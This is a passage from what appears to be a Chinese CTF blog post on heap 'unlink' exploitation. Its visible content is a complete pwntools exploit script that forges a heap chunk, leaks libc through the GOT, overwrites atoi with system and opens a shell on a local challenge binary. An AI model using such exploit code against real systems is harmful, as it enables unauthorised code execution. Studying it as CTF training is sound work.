+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.23.so&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./heap&quot;</span>)</span><br><span class="line"></span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>(<span class="params">command = <span class="string">&quot;&quot;</span></span>):</span></span><br><span class="line">    gdb.attach(sh,command)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">command</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;choice:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(command))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(<span class="built_in">len</span>(content)))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">idx</span>):</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;item:&quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x30</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">fake = <span class="number">0x6020D8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(fake - <span class="number">0x18</span>) + p64(fake - <span class="number">0x10</span>)</span><br><span class="line">payload += p64(<span class="number">0x20</span>) + p64(<span class="number">0x20</span>)</span><br><span class="line">payload += p64(<span class="number">0x30</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,payload)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">dbg(<span class="string">&quot;x/20gx 0x6020C0&quot;</span>)</span><br><span class="line">free_plt = elf.plt[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">pus_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x80</span>) + p64(free_got))</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">sh.recv(<span class="number">4</span>)</span><br><span class="line">c = sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">addr = u64(c)</span><br><span class="line">base = addr - libc.symbols[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">print(<span class="string">&quot;base ==&gt; %s&quot;</span>%<span class="built_in">hex</span>(base))</span><br><span class="line">system = base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x80</span>)+p64(atoi_got))</span><br><span class="line">edit(<span class="number">0</span>,p64(system))</span><br><span class="line">sh.sendline(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/pwn/" rel="tag"><i class="fa fa-tag"></i> pwn</a>
+          
+            <a href="/tags/heap/" rel="tag"><i class="fa fa-tag"></i> heap</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/ret2dl.html" rel="next" title="ret2dl_runtime_resolve">
+                <i class="fa fa-chevron-left"></i> ret2dl_runtime_resolve
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/off_by_one.html" rel="prev" title="off by one">
+                off by one <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/head.png"
+                alt="" />
+            
+              <p class="site-author-name" itemprop="name"></p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">53</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">30</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/ethushiroha" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#unlink-%E7%AE%80%E4%BB%8B"><span class="nav-number">1.</span> <span class="nav-text">unlink 简介</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%A4%BA%E4%BE%8B"><span class="nav-number">2.</span> <span class="nav-text">示例</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%9D%E6%8A%A4"><span class="nav-number">2.1.</span> <span class="nav-text">保护</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BA%90%E7%A0%81"><span class="nav-number">2.2.</span> <span class="nav-text">源码</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#main"><span class="nav-number">2.2.1.</span> <span class="nav-text">main</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#add-item"><span class="nav-number">2.2.2.</span> <span class="nav-text">add_item</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#show-item"><span class="nav-number">2.2.3.</span> <span class="nav-text">show_item</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#remove-item"><span class="nav-number">2.2.4.</span> <span class="nav-text">remove_item</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E7%82%B9"><span class="nav-number">2.3.</span> <span class="nav-text">漏洞点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">2.4.</span> <span class="nav-text">exp</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BC%AA%E9%80%A0%E5%A0%86%E5%9D%97"><span class="nav-number">2.4.1.</span> <span class="nav-text">伪造堆块</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#unlink"><span class="nav-number">2.4.2.</span> <span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%8C%E6%95%B4%E7%9A%84exp"><span class="nav-number">2.4.3.</span> <span class="nav-text">完整的exp</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <!--
+<div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">stdout</span>
+
+  
+</div>
+-->
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
